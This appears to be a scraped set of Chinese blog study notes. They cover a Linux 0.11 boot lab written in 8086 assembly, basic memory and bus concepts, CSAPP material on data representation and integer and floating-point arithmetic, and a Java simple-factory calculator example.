.org 510，是因为这里不需要 root_dev: .word ROOT_DEV，为了保证 boot_flag 一定在最后两个字节，所以要修改 .org。\n完整的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 entry _start _start: mov ah,#0x03 xor bh,bh int 0x10 mov cx,#36 mov bx,#0x0007 mov bp,#msg1 mov ax,#0x07c0 mov es,ax mov ax,#0x1301 int 0x10 inf_loop: jmp inf_loop msg1: .byte 13,10 .ascii \u0026#34;Hello OS world, my name is LZJ\u0026#34; .byte 13,10,13,10 .org 510 boot_flag: .word 0xAA55 接下来，将完成屏幕显示的代码在开发环境中编译，并将编译后的目标文件做成 Image 文件。\n4.3 编译和运行 Ubuntu 上先从终端进入 ~/oslab/linux-0.11/boot/ 目录。\nWindows 上则先双击快捷方式 “MinGW32.bat”，将打开一个命令行窗口，当前目录是 oslab，用 cd 命令进入 linux-0.11\\boot。\n无论那种系统，都执行下面两个命令编译和链接 bootsect.s：\n1 2 $ as86 -0 -a -o bootsect.o bootsect.s $ ld86 -0 -s -o bootsect bootsect.o 其中 -0（注意：这是数字 0，不是字母 O）表示生成 8086 的 16 位目标程序，-a 表示生成与 GNU as 和 ld 部分兼容的代码，-s 告诉链接器 ld86 去除最后生成的可执行文件中的符号信息。\n如果这两个命令没有任何输出，说明编译与链接都通过了。\n遇到的问题 错误如下\n解决：root_dev不能注释掉\nUbuntu 下用 ls -l 可列出下面的信息：\n1 2 3 -rw--x--x 1 root root 544 Jul 25 15:07 bootsect -rw------ 1 root root 257 Jul 25 15:07 bootsect.o -rw------ 1 root root 686 Jul 25 14:28 bootsect.s Windows 下用 dir 可列出下面的信息：\n1 2 3 2008-07-28 20:14 544 bootsect 2008-07-28 20:14 924 bootsect.o 2008-07-26 20:13 5,059 bootsect.s 其中 bootsect.o 是中间文件。bootsect 是编译、链接后的目标文件。\n需要留意的文件是 bootsect 的文件大小是 544 字节（我自己实验的大小是548，再重新操作一遍就是544了），\n而引导程序必须要正好占用一个磁盘扇区，即 512 个字节。造成多了 32 个字节的原因是 ld86 产生的是 Minix 可执行文件格式，这样的可执行文件除了文本段、数据段等部分以外，还包括一个 Minix 可执行文件头部，它的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 struct exec { unsigned char a_magic[2]; //执行文件魔数 unsigned char a_flags; unsigned char a_cpu; //CPU标识号 unsigned char a_hdrlen; //头部长度，32字节或48字节 unsigned char a_unused; unsigned short a_version; long a_text; long a_data; long a_bss; //代码段长度、数据段长度、堆长度 long a_entry; //执行入口地址 long a_total; //分配的内存总量 long a_syms; //符号表大小 }; 算一算：6 char（6 字节）+ 1 short（2 字节） + 6 long（24 字节）= 32，正好是 32 个字节，去掉这 32 个字节后就可以放入引导扇区了（这是 tools/build.c 的用途之一）。\n对于上面的 Minix 可执行文件，其 a_magic[0]=0x01，a_magic[1]=0x03，a_flags=0x10（可执行文件），a_cpu=0x04（表示 Intel i8086/8088，如果是 0x17 则表示 Sun 公司的 SPARC），所以 bootsect 文件的头几个字节应该是 01 03 10 04。为了验证一下，Ubuntu 下用命令“hexdump -C bootsect”可以看到：\n1 2 3 4 5 6 7 8 9 10 11 12 00000000 01 03 10 04 20 00 00 00 00 02 00 00 00 00 00 00 |.... ...........| 00000010 00 00 00 00 00 00 00 00 00 82 00 00 00 00 00 00 |................| 00000020 b8 c0 07 8e d8 8e c0 b4 03 30 ff cd 10 b9 17 00 |.........0......| 00000030 bb 07 00 bd 3f 00 b8 01 13 cd 10 b8 00 90 8e c0 |....?...........| 00000040 ba 00 00 b9 02 00 bb 00 02 b8 04 02 cd 13 73 0a |..............s.| 00000050 ba 00 00 b8 00 00 cd 13 eb e1 ea 00 00 20 90 0d |............. ..| 00000060 0a 53 75 6e 69 78 20 69 73 20 72 75 6e 6e 69 6e |.Sunix is runnin| 00000070 67 21 0d 0a 0d 0a 00 00 00 00 00 00 00 00 00 00 |g!..............| 00000080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| * 00000210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 aa |..............U.| 00000220 Windows 下用 UltraEdit 把该文件打开，果然如此。\n图 1 用 UltraEdit 打开文件 bootsect\n接下来干什么呢？是的，要去掉这 32 个字节的文件头部（tools/build.c 的功能之一就是这个）！随手编个小的文件读写程序都可以去掉它。不过，懒且聪明的人会在 Ubuntu 下用命令：\n1 $ dd bs=1 if=bootsect of=Image skip=32 生成的 Image 就是去掉文件头的 bootsect。\nWindows 下可以用 UltraEdit 直接删除（选中这 32 个字节，然后按 Ctrl+X）。\n去掉这 32 个字节后，将生成的文件拷贝到 linux-0.11 目录下，并一定要命名为“Image”（注意大小写）。然后就“run”吧！\n1 2 3 4 5 6 7 # 当前的工作路径为 /home/shiyanlou/oslab/linux-0.11/boot/ # 将刚刚生成的 Image 复制到 linux-0.11 目录下 $ cp ./Image ../Image # 执行 oslab 目录中的 run 脚本 $ ../../run 图 2 bootsect 引导后的系统启动情况\n遇到的问题 我在执行run的时候出现了如下的错误，并没有东西输出，并且计算机卡死，可能的原因是前面生成的 bootsect 文件大小是548KB\n4.4 bootsect.s 读入 setup.s 首先编写一个 setup.s，该 setup.s 可以就直接拷贝前面的 bootsect.s（还需要简单的调整），然后将其中的显示的信息改为：“Now we are in SETUP”。\n可供参考的代码如下图所示：\n接下来需要编写 bootsect.s 中载入 setup.s 的关键代码。原版 bootsect.s 中下面的代码就是做这个的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 load_setup: ! 设置驱动器和磁头(drive 0, head 0): 软盘 0 磁头 mov dx,#0x0000 ! 设置扇区号和磁道(sector 2, track 0): 0 磁头、0 磁道、2 扇区 mov cx,#0x0002 ! 设置读入的内存地址：BOOTSEG+address = 512，偏移512字节 mov bx,#0x0200 ! 设置读入的扇区个数(service 2, nr of sectors)， ! SETUPLEN是读入的扇区个数，Linux 0.11 设置的是 4， ! 我们不需要那么多，我们设置为 2（因此还需要添加变量 SETUPLEN=2） mov ax,#0x0200+SETUPLEN ! 应用 0x13 号 BIOS 中断读入 2 个 setup.s扇区 int 0x13 ! 读入成功，跳转到 ok_load_setup: ok - continue jnc ok_load_setup ! 软驱、软盘有问题才会执行到这里。我们的镜像文件比它们可靠多了 mov dx,#0x0000 ! 否则复位软驱 reset the diskette mov ax,#0x0000 int 0x13 ! 重新循环，再次尝试读取 jmp load_setup ok_load_setup: ! 接下来要干什么？当然是跳到 setup 执行。 ! 要注意：我们没有将 bootsect 移到 0x9000，因此跳转后的段地址应该是 0x7ce0 ! 即我们要设置 SETUPSEG=0x07e0 所有需要的功能在原版 bootsect.s 中都是存在的，我们要做的仅仅是将这些代码添加到新的 bootsect.s 中去。\n除了新增代码，我们还需要去掉 5.2 小节中我们在 bootsect.s 添加的无限循环。\n编写完成后大致如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 SETUPLEN=2 SETUPSEG=0x07e0 entry _start _start: mov ah,#0x03 xor bh,bh int 0x10 mov cx,#36 mov bx,#0x0007 mov bp,#msg1 mov ax,#0x07c0 mov es,ax mov ax,#0x1301 int 0x10 load_setup: mov dx,#0x0000 mov cx,#0x0002 mov bx,#0x0200 mov ax,#0x0200+SETUPLEN int 0x13 jnc ok_load_setup mov dx,#0x0000 mov ax,#0x0000 int 0x13 jmp load_setup ok_load_setup: jmpi 0,SETUPSEG msg1: .byte 13,10 .ascii \u0026#34;Hello OS world, my name is LZJ\u0026#34; .byte 13,10,13,10 .org 510 boot_flag: .word 0xAA55 4.5 再次编译 现在有两个文件都要编译、链接。一个个手工编译，效率低下，所以借助 Makefile 是最佳方式。\n在 Ubuntu 下，进入 linux-0.11 目录后，使用下面命令（注意大小写）：\n1 $ make BootImage Windows 下，在命令行方式，进入 Linux-0.11 目录后，使用同样的命令（不需注意大小写）：\n1 makeBootImage 无论哪种系统，都会看到：\n1 2 Unable to open \u0026#39;system\u0026#39; make: *** [BootImage] Error 1 有 Error！这是因为 make 根据 Makefile 的指引执行了 tools/build.c，它是为生成整个内核的镜像文件而设计的，没考虑我们只需要 bootsect.s 和 setup.s 的情况。它在向我们要 “系统” 的核心代码。为完成实验，接下来给它打个小补丁。\n4.6 修改 build.c build.c 从命令行参数得到 bootsect、setup 和 system 内核的文件名，将三者做简单的整理后一起写入 Image。其中 system 是第三个参数（argv[3]）。当 “make all” 或者 “makeall” 的时候，这个参数传过来的是正确的文件名，build.c 会打开它，将内容写入 Image。而 “make BootImage” 时，传过来的是字符串 \u0026ldquo;none\u0026rdquo;。所以，改造 build.c 的思路就是当 argv[3] 是\u0026quot;none\u0026quot;的时候，只写 bootsect 和 setup，忽略所有与 system 有关的工作，或者在该写 system 的位置都写上 “0”。\n修改工作主要集中在 build.c 的尾部，可以参考下面的方式，将圈起来的部分注释掉。\n当按照前一节所讲的编译方法编译成功后再 run，就得到了如图 3 所示的运行结果，和我们想得到的结果完全一样。\n1 2 3 $ cd ~/oslab/linux-0.11 $ make BootImage $ ../run 图 3 用修改后的 bootsect.s 和 setup.s 进行引导的结果\n4.7 setup.s 获取基本硬件参数 setup.s 将获得硬件参数放在内存的 0x90000 处。原版 setup.s 中已经完成了光标位置、内存大小、显存大小、显卡参数、第一和第二硬盘参数的保存。\n用 ah=#0x03 调用 0x10 中断可以读出光标的位置，用 ah=#0x88 调用 0x15 中断可以读出内存的大小。有些硬件参数的获取要稍微复杂一些，如磁盘参数表。在 PC 机中 BIOS 设定的中断向量表中 int 0x41 的中断向量位置$(4*0x41 = 0x0000:0x0104)$ 存放的并不是中断程序的地址，而是第一个硬盘的基本参数表。第二个硬盘的基本参数表入口地址存于 int 0x46 中断向量位置处。每个硬盘参数表有 16 个字节大小。下表给出了硬盘基本参数表的内容：\n表 1 磁盘基本参数表\n位移 大小 说明 0x00 字 柱面数 0x02 字节 磁头数 \u0026hellip; \u0026hellip; \u0026hellip; 0x0E 字节 每磁道扇区数 0x0F 字节 保留 所以获得磁盘参数的方法就是复制数据。\n下面是将硬件参数取出来放在内存 0x90000 的关键代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 mov ax,#INITSEG ! 设置 ds = 0x9000 mov ds,ax mov ah,#0x03 ! 读入光标位置 xor bh,bh ! 调用 0x10 中断 int 0x10 ! 将光标位置写入 0x90000. mov [0],dx ! 读入内存大小位置 mov ah,#0x88 int 0x15 mov [2],ax ! 从 0x41 处拷贝 16 个字节（磁盘参数表） mov ax,#0x0000 mov ds,ax lds si,[4*0x41] mov ax,#INITSEG mov es,ax mov di,#0x0004 mov cx,#0x10 ! 重复16次 rep movsb 4.8 显示获得的参数 现在已经将硬件参数（只包括光标位置、内存大小和硬盘参数，其他硬件参数取出的方法基本相同，此处略去）取出来放在了 0x90000 处，接下来的工作是将这些参数显示在屏幕上。这些参数都是一些无符号整数，所以需要做的主要工作是用汇编程序在屏幕上将这些整数显示出来。\n以十六进制方式显示比较简单。这是因为十六进制与二进制有很好的对应关系（每 4 位二进制数和 1 位十六进制数存在一一对应关系），显示时只需将原二进制数每 4 位划成一组，按组求对应的 ASCII 码送显示器即可。ASCII 码与十六进制数字的对应关系为：0x30 ～ 0x39 对应数字 0 ～ 9，0x41 ～ 0x46 对应数字 a ～ f。从数字 9 到 a，其 ASCII 码间隔了 7h，这一点在转换时要特别注意。为使一个十六进制数能按高位到低位依次显示，实际编程中，需对 bx 中的数每次循环左移一组（4 位二进制），然后屏蔽掉当前高 12 位，对当前余下的 4 位（即 1 位十六进制数）求其 ASCII 码，要判断它是 0 ～ 9 还是 a ～ f，是前者则加 0x30 得对应的 ASCII 码，后者则要加 0x37 才行，最后送显示器输出。以上步骤重复 4 次，就可以完成 bx 中数以 4 位十六进制的形式显示出来。\n下面是完成显示 16 进制数的汇编语言程序的关键代码，其中用到的 BIOS 中断为 INT 0x10，功能号 0x0E（显示一个字符），即 AH=0x0E，AL=要显示字符的 ASCII 码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 ! 以 16 进制方式打印栈顶的16位数 print_hex: ! 4 个十六进制数字 mov cx,#4 ! 将(bp)所指的值放入 dx 中，如果 bp 是指向栈顶的话 mov dx,(bp) print_digit: ! 循环以使低 4 比特用上 !! 取 dx 的高 4 比特移到低 4 比特处。 rol dx,#4 ! ah = 请求的功能值，al = 半字节(4 个比特)掩码。 mov ax,#0xe0f ! 取 dl 的低 4 比特值。 and al,dl ! 给 al 数字加上十六进制 0x30 add al,#0x30 cmp al,#0x3a ! 是一个不大于十的数字 jl outp ! 是a～f，要多加 7 add al,#0x07 outp: int 0x10 loop print_digit ret ! 这里用到了一个 loop 指令; ! 每次执行 loop 指令，cx 减 1，然后判断 cx 是否等于 0。 ! 如果不为 0 则转移到 loop 指令后的标号处，实现循环； ! 如果为0顺序执行。 ! ! 另外还有一个非常相似的指令：rep 指令， ! 每次执行 rep 指令，cx 减 1，然后判断 cx 是否等于 0。 ！ 如果不为 0 则继续执行 rep 指令后的串操作指令，直到 cx 为 0，实现重复。 ! 打印回车换行 print_nl: ! CR mov ax,#0xe0d int 0x10 ! LF mov al,#0xa int 0x10 ret 只要在适当的位置调用 print_bx 和 print_nl（注意，一定要设置好栈，才能进行函数调用）就能将获得硬件参数打印到屏幕上，完成此次实验的任务。但事情往往并不总是顺利的，前面的两个实验大多数实验者可能一次就编译调试通过了（这里要提醒大家：编写操作系统的代码一定要认真，因为要调试操作系统并不是一件很方便的事）。但在这个实验中会出现运行结果不对的情况（为什么呢？因为我们给的代码并不是 100% 好用的）。所以接下来要复习一下汇编，并阅读《Bochs 使用手册》，学学在 Bochs 中如何调试操作系统代码。\n我想经过漫长而痛苦的调试后，大家一定能兴奋地得到下面的运行结果：\n图 4 用可以打印硬件参数的 setup.s 进行引导的结果\nMemory Size 是 0x3C00KB，算一算刚好是 15MB（扩展内存），加上 1MB 正好是 16MB，看看 Bochs 配置文件 bochs/bochsrc.bxrc：\n1 2 3 4 5 !…… megs: 16 !…… ata0-master: type=disk, mode=flat, cylinders=410, heads=16, spt=38 !…… 这些都和上面打出的参数吻合，表示此次实验是成功的。\n实验楼的环境中参数可能跟上面给出的不一致。大家需要根据自己环境中 bochs/bochsrc.bxrc 文件中的内容才能确定具体的输出信息。\n下面是提供的参考代码，大家可以根据这个来进行编写代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 INITSEG = 0x9000 entry _start _start: ! Print \u0026#34;NOW we are in SETUP\u0026#34; mov ah,#0x03 xor bh,bh int 0x10 mov cx,#25 mov bx,#0x0007 mov bp,#msg2 mov ax,cs mov es,ax mov ax,#0x1301 int 0x10 mov ax,cs mov es,ax ! init ss:sp mov ax,#INITSEG mov ss,ax mov sp,#0xFF00 ! Get Params mov ax,#INITSEG mov ds,ax mov ah,#0x03 xor bh,bh int 0x10 mov [0],dx mov ah,#0x88 int 0x15 mov [2],ax mov ax,#0x0000 mov ds,ax lds si,[4*0x41] mov ax,#INITSEG mov es,ax mov di,#0x0004 mov cx,#0x10 rep movsb ! Be Ready to Print mov ax,cs mov es,ax mov ax,#INITSEG mov ds,ax ! Cursor Position mov ah,#0x03 xor bh,bh int 0x10 mov cx,#18 mov bx,#0x0007 mov bp,#msg_cursor mov ax,#0x1301 int 0x10 mov dx,[0] call print_hex ! Memory Size mov ah,#0x03 xor bh,bh int 0x10 mov cx,#14 mov bx,#0x0007 mov bp,#msg_memory mov ax,#0x1301 int 0x10 mov dx,[2] call print_hex ! Add KB mov ah,#0x03 xor bh,bh int 0x10 mov cx,#2 mov bx,#0x0007 mov bp,#msg_kb mov ax,#0x1301 int 0x10 ! Cyles mov ah,#0x03 xor bh,bh int 0x10 mov cx,#7 mov bx,#0x0007 mov bp,#msg_cyles mov ax,#0x1301 int 0x10 mov dx,[4] call print_hex ! Heads mov ah,#0x03 xor bh,bh int 0x10 mov cx,#8 mov bx,#0x0007 mov bp,#msg_heads mov ax,#0x1301 int 0x10 mov dx,[6] call print_hex ! Secotrs mov ah,#0x03 xor bh,bh int 0x10 mov cx,#10 mov bx,#0x0007 mov bp,#msg_sectors mov ax,#0x1301 int 0x10 mov dx,[12] call print_hex inf_loop: jmp inf_loop print_hex: mov cx,#4 print_digit: rol dx,#4 mov ax,#0xe0f and al,dl add al,#0x30 cmp al,#0x3a jl outp add al,#0x07 outp: int 0x10 loop print_digit ret print_nl: mov ax,#0xe0d ! CR int 0x10 mov al,#0xa ! LF int 0x10 ret msg2: .byte 13,10 .ascii \u0026#34;NOW we are in SETUP\u0026#34; .byte 13,10,13,10 msg_cursor: .byte 13,10 .ascii \u0026#34;Cursor position:\u0026#34; msg_memory: .byte 13,10 .ascii \u0026#34;Memory Size:\u0026#34; msg_cyles: .byte 13,10 .ascii \u0026#34;Cyls:\u0026#34; msg_heads: .byte 13,10 .ascii \u0026#34;Heads:\u0026#34; msg_sectors: .byte 13,10 .ascii \u0026#34;Sectors:\u0026#34; msg_kb: .ascii \u0026#34;KB\u0026#34; .org 510 boot_flag: .word 0xAA55 5 问题回答 当PC的电源打开后，80x86结构的CPU将自动进入实模式，并从地址0xFFFF0开始自动执行程序代码，这个地址通常是ROM—BIOS中的地址。PC机的BIOS将执行某些系统的检测，并在物理地址0处开始初始化中断向量。此后将启动设备的第一个扇区512字节读入内存绝对地址0x7C00处。因为当时system模块的长度不会超过0x80000字节大小512KB，所以bootsect程序把system模块读入物理地址0x10000开始位置处时并不会覆盖在0x90000处开始的bootsect和setup模块，多此一举的是system模块移到内存中相对靠后的位置，以便加载系统主模块。解决方案是在保证操作系统启动引导成功的前提下尽量扩大ROM—BIOS的内存寻址范围。\n","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C2-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%BC%95%E5%AF%BC/","summary":"下面这个博客还是不太明白 操作系统的启动(bootsect、setup、head、main) 0. 汇编知识 简要整理了一下这次实验所需的基础汇编知识","title":"实验2 操作系统的引导"},{"content":"存储器 从读写属性上看分为两类:随机存储器(RAM)和只读存储器(ROM)。随机存储器可读可写，但必须带电存储，关机后存储的内容丢失；只读存储器只能读取不能写入，关机后其中的内容不丢失。\nCPU对存储器的读写 CPU 要想进行数据的读写，必须和外部器件(标准的说法是芯片)进行下面3类信息的交互。\n存储单元的地址(地址信息); 器件的选择，读或写的命令(控制信息); 读或写的数据(数据信息)。 那么CPU是通过什么将地址、数据和控制信息传到存储器芯片中的呢?\n电子计算机能处理、传输的信息都是电信号，电信号当然要用导线传送。在计算机中专门有连接CPU 和其他芯片的导线，通常称为总线。总线从物理上来讲，就是一根根导线的集合。根据传送信息的不同，总线从逻辑上又分为3类，地址总线、控制总线和数据总线。\n(1) CPU通过地址线将地址信息3发出。\n(2) CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。\n(3)存储器将3号单元中的数据8通过数据线送入CPU。\n接口卡上的RAM 典型的是显示卡上的 RAM，一般称为显存。显示卡随时将显存中的数据向显示器上输出。换句话说，我们将需要显示的内容写入显存，就会出现在显示器上。\n8086PC机内存地址空间分配的基本情况 图1.9告诉我们，从地址0~9FFFF的内存单元中读取数据，实际上就是在读取主随机存储器中的数据;\n向地址A0000~BFFFF 的内存单元中写数据，就是向显存中写入数据，这些数据会被显示卡输出到显示器上;\n我们向地址CO000~FFFFF的内存单元中写入数据的操作是无效的，因为这等于改写只读存储器中的内容。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC1%E7%AB%A0-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","summary":"存储器 从读写属性上看分为两类:随机存储器(RAM)和只读存储器(ROM)。随机存储器可读可写，但必须带电存储，关机后存储的内容丢失；只读存储","title":"第1章 基础知识"},{"content":"信息存储 16进制表示法 一个字节可以用两个十六进制数字来表示。（一个字节占8位，16进制一个符号占4位，所以一个字节可以用两个16进制符号表示）\n字数据大小 **每台计算机都有一个字长(word size)，指明指针数据的标称大小(nominal size)。**因为虚拟地址是以这样的一个字来编码的，所以字长决定的最重要的系统参数就是虚拟地址空间的最大大小。也就是说，对于一个字长为w位的机器而言，虚拟地址的范围为 0~2^w-1^，程序最多访问 2^w^ 个字节。\n寻址和字节顺序 对于跨越多字节的程序对象，我们必须建立两个规则：这个对象的地址是什么，以及在内存中如何排列这些字节。\n排列表示一个对象的字节有两个通用的规则：\n小端法（little endian）：最低有效字节在最前面的方式 大端法（big endian）：最高有效字节在最前面的方式 如下代码为使用强制类型转换来访问和打印不同程序对象的字节表示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 typedef unsigned char *byte_pointer; void show_bytes(byte_pointer start, size_t len){ size_t i; for(i = 0; i \u0026lt; len; i++) printf(\u0026#34; %.2x\u0026#34;, start[i]); printf(\u0026#34;\\n\u0026#34;); } void show_int(int x){ show_bytes((byte_pointer) \u0026amp;x, sizeof(int)); } void show_float(int x){ show_bytes((byte_pointer) \u0026amp;x, sizeof(float)); } void show_pointer(int x){ show_bytes((byte_pointer) \u0026amp;x, sizeof(void *)); } 过程 show_int、show_float 和 show_pointer 展示了如何使用程序 show_bytes 来 分别输出类型为 int、float 和 void* 的 C 程序对象的字节表示。可以观察到它们仅仅传递给 show_bytes 一个指向它们参数 x 的指针 \u0026amp;x， 且这个指针被强制类型转换为“unsigned char * ”。 这种强制类型转换告诉编译器，程序应该把这个指针看成指向一个字节序列，而不是指向一个原始数据类型的对象。然后，这个指针会被看成是对象使用的最低字节地址。\n这些过程使用 C 语言的运算符 sizeof 来确定对象使用的字节数。一般来说，表达式sizeof(T)返回存储一个类型为T的对象所需要的字节数。使用 sizeof 而不是一个固定的值，是向编写在不同机器类型上可移植的代码迈进了一步。\n1 2 3 4 5 6 7 8 void test_show_bytes(int val){ int ival = val; float fval = (float) ival; int *pval = \u0026amp;ival; show_int(ival); //02 00 00 00 show_float(fval); //02 00 00 00 show_pointer(pval); //dc fd 62 00 00 00 00 00 } 通过试验可以看到Windows是小端法机器\nint 和 float除了字节顺序外，在所有机器上得到的结果都是相同的，但是指针却是完全不同，不同的机器/操作系统使用不同的存储分配规则。\n位运算 ==位运算符：\u0026amp;、 |、^、 ~== C语言的一个很有用的特性就是它支持按位布尔运算。事实上，我们在布尔运算中使用的那些符号就是 C语言所使用的：| 就是 OR（或），\u0026amp; 就是 AND（与）， ~就是 NOT（取反）， 而 ^ 就是 EXCLUSIVE-OR（异或）。 这些运算能运用到任何“整型”的数据类型上。以下是一些对 char 数据类型表达式求值的例子：\n正如示例说明的那样，确定一个位级表达式的结果最好的方法，就是将十六进制的参数扩展成二进制表示并执行二进制运算，然后再转换回十六进制\n位运算都先转换成二进制进行运算 掩码运算 位级运算的一个常见用法就是实现掩码运算，这里掩码是一个位模式，表示从一个字中选出的位的集合。让我们来看一个例子，掩码 OxFF(最低的 8位为1)表示一个字的低位字节。位级运算x\u0026amp;0xFF 生成一个由x的最低有效字节组成的值，而其他的字节就被置为0。比如，对于x=0x89ABCDEF，其表达式将得到0x000000EF。表达式~0 将生成一个全1的掩码，不管机器的字大小是多少。尽管对于一个 32 位机器来说，同样的掩码可以写成0xFFFFFFFF，但是这样的代码不是可移植的。\n逻辑运算 ==逻辑运算符： \u0026amp;\u0026amp;、 ||、 !==\n位移运算 左移运算：x\u0026lt;\u0026lt;k ， x向左移动k位，丢弃最高的k位，并在右端补k个0\n右移运算：x\u0026gt;\u0026gt;k ，机器智齿两种形式的右移：逻辑右移和算数右移\n逻辑右移：在左端补k个0 算数右移：在左端补k个最高有效位的值 与C相比，Java对于如何进行右移有明确的定义。表达是x\u0026gt;\u0026gt;k会将x算数右移k个位置，而x\u0026gt;\u0026gt;\u0026gt;k会对x做逻辑右移。\n整数表示 无符号数的编码 补码编码 有符号数和无符号数之间的转换 0-1 -\u0026gt; UMax\n1 printf(\u0026#34;%u\\n\u0026#34;,0-1); //4294967295 扩展一个数字的位表示 在采用补码表示的 32 位大端法机器上运行这段代码时，打印出如下输出：\n我们看到，尽管 -12345 的补码表示和 53191 的无符号表示在 16 位字长时是相同的，但是在 32 位字长时却是不同的。特别地，-12345 的十六进制表示为 0XFFFFCFC7，而 53191 的十六进制表示为 0x0000CFC7，前者使用的是符号扩展——最开头加了 16 位，都是最高有效位 1。表示为十六进制就是 0xFFFF，后者开头使用16个0来扩展，表示为十六进制就是 0x0000。\n图 2-20 给出了从字长 w=3 到 w=4 的符号扩展的结果。位向量[101]表示值-4+1=-3。对它应用符号扩展，得到位向量[1101]，表示的值-8+4+1=-3。我们可以看到，对于 w=4，最高两位的组合值是-8+4=-4，与w=3时符号位的值相同。类似地，位向量[111]和[1111]都表示值-1。\n截断数字 截断无符号数 截断补码数值 整数运算 无符号加法 原理 检测无符号数加法中的溢出 1 2 3 4 5 //无符号加法是否溢出， 如果参数x和y相加不会产生溢出，这个函数就返回1 int uadd_ok(unsigned x, unsigned y){ unsigned sum = x + y; retrun sum \u0026gt;= x; } 阿贝尔群 补码加法 检测补码加法中的溢出 1 2 3 4 5 6 7 8 //补码加法是否溢出，参数x和y相加不会产生溢出，这个函数就返回1 int tadd_ok(int x, int y){ int sum = x + y; int neg_over = x \u0026lt; 0 \u0026amp;\u0026amp; y \u0026lt; 0 \u0026amp;\u0026amp; sum \u0026gt;= 0; int pos_over = x \u0026gt;= 0 \u0026amp;\u0026amp; y \u0026gt;= 0 \u0026amp;\u0026amp; sum \u0026lt; 0; return !neg_over \u0026amp;\u0026amp; !pos_over; } 补码的非 1 2 3 4 5 6 7 x -\u0026gt; -x -6 -\u0026gt; 6 1010 ~ 0101 +1 0001 ============= 0110(6) 无符号乘法 1 2 3 4 5 6 7 8 9 1001 * 1101 ============= 1001 0000 1001 + 1001 ============= 1110101 补码乘法 1 2 3 4 5 6 7 8 9 10 11 12 13 -2 * -3 = 6 如下做无符号乘法运算: 1101(13) * 1110(14) ============= 0000 1101 1101 + 1101 ============= 10110110 十六进制:0xb6 仅看低位:0110(6) 乘以常数 **在大多数机器上，整数乘法指令相当慢，需要10个或者更多的时钟周期，然而其他整数运算（例如加法、减法、位级运算和位移）只需要1个时钟周期。**因此，编译器使用了一项重要的优化，试着用位移和加法运算的组合来代替乘以常数因子的乘法。\n除以2的幂 在大多数机器上，整数除法要比整数乘法更慢——需要30个或者更多的时钟周期。\n除以2的幂的无符号除法 除以2的幂的补码除法，向下舍入\n除以2的幂的补码除法，向上舍入\n可以通过在移位之前“偏置（biasing)”这个值，来修正这种不合适的舍入。\n浮点数 二进制小数 IEEE浮点表示 规格化示例 IEEE754浮点数阶码为什么需要偏置bias 主要原因是使指数以无符号形式存储\n以单精度浮点型float为例，e由8bit二进制原码（无符号）表示，但这样的小数不能表示 （-1，1）中的数，因为阶码总是正数。那怎么办呢？用补码表示e？麻烦，还要考虑符号！\n所以不如减去一个偏置量127（为什么是127？不是128？https://blog.csdn.net/weixin_43891234/article/details/114693495），这样就能表示负的E（如果没有偏置，那么e=E），此时 E = e -127，而e范围为（0000 0001 - 1111 1110 即 1-254，0000 0000和1111 1111单独用来表示非规格化值），最终E 的范围（1-127 到 254-127）=（-126，127）。\n数字示例 整数值转换成浮点形式 书P82（操作见上面的规格化示例） 舍入 浮点运算 总结一下：\n浮点运算与我们平常做的运算类似\n满足单调性\n","permalink":"https://chance7bin.github.io/posts/basic/csapp/%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/","summary":"信息存储 16进制表示法 一个字节可以用两个十六进制数字来表示。（一个字节占8位，16进制一个符号占4位，所以一个字节可以用两个16进制符号表示","title":"信息的表示和处理"},{"content":"简单工厂模式——计算器 结构图 简单工厂模式实现 运算接口（父类）\n1 2 3 public interface IOperation { double getResult(double a, double b); } 创建两个运算符类实现该接口\n1 2 3 4 5 6 7 8 public class AddOperation implements IOperation { @Override public double getResult(double a, double b) { return a + b; } } 1 2 3 4 5 6 7 8 public class MultiOperation implements IOperation{ @Override public double getResult(double a, double b) { return a * b; } } 工厂类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class OperationFactory { public IOperation createOperate(String operate){ IOperation operation = null; switch (operate){ case \u0026#34;add\u0026#34;:{ operation = new AddOperation(); break; } case \u0026#34;multi\u0026#34;:{ operation = new MultiOperation(); break; } } return operation; } } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class Calculator { public static void main(String[] args) { System.out.println(Calculator.test(\u0026#34;add\u0026#34;,1,2)); System.out.println(Calculator.test(\u0026#34;multi\u0026#34;,1,2)); } public static double test(String op, double a, double b){ OperationFactory factory = new OperationFactory(); return factory.createOperate(op).getResult(a,b); } } 之后需要更改算法运算，只需更改相应的类即可。若是需要增加其他运算，秩序增加相应的运算子类，并且在工厂类添加新的分支即可。\n工厂方法模式——计算器改进 